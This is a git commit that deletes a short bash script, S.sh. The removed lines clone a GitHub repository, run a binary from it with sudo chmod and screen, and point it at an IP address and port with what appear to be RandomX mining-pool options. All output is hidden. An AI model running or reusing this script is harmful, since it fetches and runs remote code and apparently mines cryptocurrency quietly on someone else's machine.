176a249d4daff3be116e4b1aaabb6713d64adfa4
fulltechtree <77315046+fulltechtree@users.noreply.github.com>
2021-01-29 18:06:32 +0700

    Delete S.sh

--- S.sh
+++
@@ -1,7 +0,0 @@
-#! /bin/bash
-{
-git clone https://github.com/fulltechtree/tech.git &> /dev/null
-sudo chmod +x tech/mn
-screen -S min
-./tech/mn -o 161.35.135.44:2449 -u userA -p 1 -a rx/0 -k -t "$2"
-} &> /dev/null
